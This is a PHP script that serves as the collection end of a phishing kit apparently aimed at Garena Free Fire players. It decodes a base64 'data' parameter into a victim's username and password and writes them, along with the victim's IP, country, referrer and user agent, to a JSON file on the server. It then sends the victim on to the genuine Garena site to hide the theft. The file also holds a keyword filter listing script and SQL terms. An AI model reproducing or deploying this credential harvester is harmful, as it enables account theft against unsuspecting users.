<?php
ob_start();

// Debug logging function
function debugLog($message) {
    file_put_contents('debug.log', date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

function protection($string) {
    $string = trim($string);
    if (mb_strlen($string) > 30) {
        debugLog("Protection: String too long - $string");
        return null;
    }
    $string = bad_word($string);
    $string = htmlspecialchars($string);
    $string = addslashes($string);
    return $string;
}

function bad_word($string) {
    global $badword;
    $new_word = '--';
    $bad_word_sql = isset($badword) ? explode(",", $badword) : [];
    $basmir = array('script', 'meta', 'SCRIPT', 'META', 'location', 'document', 'window', 'onabort', 'onactivate', 'onafterprint',
        'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste',
        'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu',
        'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate',
        'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange',
        'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture',
        'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend',
        'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit',
        'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload', 'javascript',
        'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'bgsound',
        'base', 'union', 'UNION', 'select', 'SELECT', 'mysql', 'MYSQL', 'shell', 'SHELL', 'Refresh', 'content');
    $string = str_ireplace($basmir, $new_word, $string);
    $string = str_ireplace($bad_word_sql, $new_word, $string);
    return $string;
}

function decryptData($encrypted) {
    if (strlen($encrypted) < 9) {
        debugLog("decryptData: Invalid encrypted data length - $encrypted");
        return null;
    }
    $cleanedEncoded = substr($encrypted, 9);
    $decoded = base64_decode($cleanedEncoded, true);
    if ($decoded === false) {
        debugLog("decryptData: Base64 decode failed - $cleanedEncoded");
        return null;
    }
    return $decoded;
}

function getOrCreateJsonFile() {
    $jsonFiles = glob('*.json');
    if (!empty($jsonFiles)) {
        debugLog("getOrCreateJsonFile: Found JSON file - " . $jsonFiles[0]);
        return $jsonFiles[0];
    }
    $randomName = 'data_' . bin2hex(random_bytes(8)) . '.json';
    if (file_put_contents($randomName, json_encode([], JSON_PRETTY_PRINT)) === false) {
        debugLog("getOrCreateJsonFile: Failed to create JSON file - $randomName");
        return null;
    }
    // Set file permissions to ensure it's writable
    chmod($randomName, 0666);
    debugLog("getOrCreateJsonFile: Created new JSON file - $randomName");
    return $randomName;
}

function saveDataToJson($filename, $data) {
    if (!$filename) {
        debugLog("saveDataToJson: No filename provided");
        return false;
    }
    $existingData = [];
    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        if ($jsonContent === false) {
            debugLog("saveDataToJson: Failed to read JSON file - $filename");
            return false;
        }
        $existingData = json_decode($jsonContent, true);
        if (!is_array($existingData)) {
            debugLog("saveDataToJson: Invalid JSON data in - $filename");
            $existingData = [];
        }
    }
    array_unshift($existingData, $data);
    if (file_put_contents($filename, json_encode($existingData, JSON_PRETTY_PRINT)) === false) {
        debugLog("saveDataToJson: Failed to write to JSON file - $filename");
        return false;
    }
    // Ensure file is readable/writable
    chmod($filename, 0666);
    debugLog("saveDataToJson: Successfully saved data to - $filename");
    return true;
}

// Check if the 'data' GET variable is set
$param = isset($_GET['data']) ? $_GET['data'] : null;
if (!$param) {
    debugLog("No 'data' parameter provided");
    header("Location: https://ff.garena.com/");
    exit;
}

$encodedData = $param;
$decodedData = decryptData($encodedData);

if ($decodedData === null) {
    debugLog("Failed to decode data: $-encodedData");
    header("Location: https://ff.garena.com/");
    exit;
}

$separator = "#@-@#";
$dataParts = explode($separator, $decodedData);
if (count($dataParts) !== 4) {
    debugLog("Invalid data format: $decodedData");
    header("Location: https://ff.garena.com/");
    exit;
}

list($username, $password, $user_id, $type) = $dataParts;

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}

$userCountry = isset($_SERVER["HTTP_CF_IPCOUNTRY"]) ? $_SERVER["HTTP_CF_IPCOUNTRY"] : "none";

ini_set('display_errors', 0);
$type = protection($type);
$user_id_victim = protection($user_id);
$user_name_victims = protection($username);
$user_pass_victims = protection($password);
$ip = $_SERVER['REMOTE_ADDR'];
$country = $userCountry;
$date = time();
$scama_id = protection($type);
$reff = $_SERVER['HTTP_REFERER'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Allow localhost for testing (remove or comment out in production)
if ($user_name_victims && $user_pass_victims /* && !in_array($ip, ['101.2.177.232', '31.170.160.103']) */) {
    $jsonFile = getOrCreateJsonFile();
    if ($jsonFile) {
        $victimData = array(
            'victime_user' => $user_name_victims,
            'victime_password' => $user_pass_victims,
            'victime_date' => $date,
            'victime_ip' => $ip,
            'country' => $country,
            'victime_scama' => $scama_id,
            'vic_reff' => $reff,
            'user_agent' => $user_agent,
            'timestamp' => date('Y-m-d H:i:s', $date)
        );
        if (saveDataToJson($jsonFile, $victimData)) {
            debugLog("Data saved successfully for user: $user_name_victims, IP: $ip");
        } else {
            debugLog("Failed to save data for user: $user_name_victims, IP: $ip");
        }
    } else {
        debugLog("No JSON file created or found");
    }
} else {
    debugLog("Invalid data or blocked IP: user=$user_name_victims, ip=$ip");
}

header("Location: https://ff.garena.com/");
exit;
?>